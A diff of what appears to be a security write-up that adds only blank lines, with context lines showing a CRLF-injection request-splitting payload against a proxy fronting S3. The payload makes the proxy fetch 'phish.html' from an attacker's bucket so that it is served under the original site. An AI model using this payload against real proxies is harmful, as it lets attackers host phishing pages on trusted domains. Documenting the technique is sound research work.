@@ -262,6 +262,7 @@ GET /s3/static/js/admin.main.js
 ```
 GET /s3/static/phish.html%20HTTP/1.1%0d%0aHost:evilbucket%0d%0a%0d%0a
 ```
+
 This will cause the proxy to make this request to S3:
 ```
 GET /original-bucket/phish.html
@@ -270,6 +271,7 @@ Host: evilbucket
 anything_else HTTP/1.1
 Host: original-bucket
 ```
+
 Which will redirect `/original-bucket/phish.html` to your bucket, so all you have to do is host `phish.html` inside a directory literally named as the name of the original bucket the proxy was requesting.
 <img width="1721" height="933" alt="untitled" src="https://github.com/user-attachments/assets/4c9944d6-045e-487e-97f0-067c6cb41482" />
 
